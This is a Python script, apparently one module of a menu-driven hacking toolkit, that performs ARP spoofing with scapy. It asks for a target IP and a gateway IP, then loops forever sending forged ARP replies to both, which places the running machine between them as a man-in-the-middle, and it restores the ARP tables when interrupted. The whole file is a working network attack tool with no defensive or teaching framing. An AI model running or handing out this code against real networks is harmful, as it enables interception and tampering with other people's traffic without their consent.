#!/usr/bin/python3

# Imports all needed variables and packages
from assets.banners import arpspoof_banner
from assets.designs import *
from assets.properties import clear_screen
import scapy.all as scapy
import time
import sys
import os


# Main function
def arpspoof_main():

    # function that takes user input
    def configuration():
        try:
            global rhost_set
            global gateway_set
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(arpspoof_banner)
            print(line)
            print('')
            print(author)
            print('Configuration:')
            print('')
            rhost_set = input('\u001b[33mRHOST \u001b[37m> ').lower()
            gateway_set = input('\u001b[33mGATEWAY \u001b[37m> ').lower()
            spoofing()
        except KeyboardInterrupt:
            exit_shell()

    def get_mac(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        return(answered_list[0][1].hwsrc)

    def spoof(target_ip, spoof_ip):
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def restore(destination_ip, source_ip):
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

    def spoofing():
        try:
            sent_packets_count = 0
            while True:
                spoof(rhost_set, gateway_set)
                spoof(gateway_set, rhost_set)
                sent_packets_count = sent_packets_count + 2
                print("[+] Packets sent: " + str(sent_packets_count)),
                sys.stdout.flush()
                os.system('sleep 3')
        except KeyboardInterrupt:
            restore(rhost_set, gateway_set)
            restore(gateway_set, rhost_set)
            exit_shell()


    def exit_shell():
        from assets.functions import exit_main
        exit_main()

    configuration()


arpspoof_main()
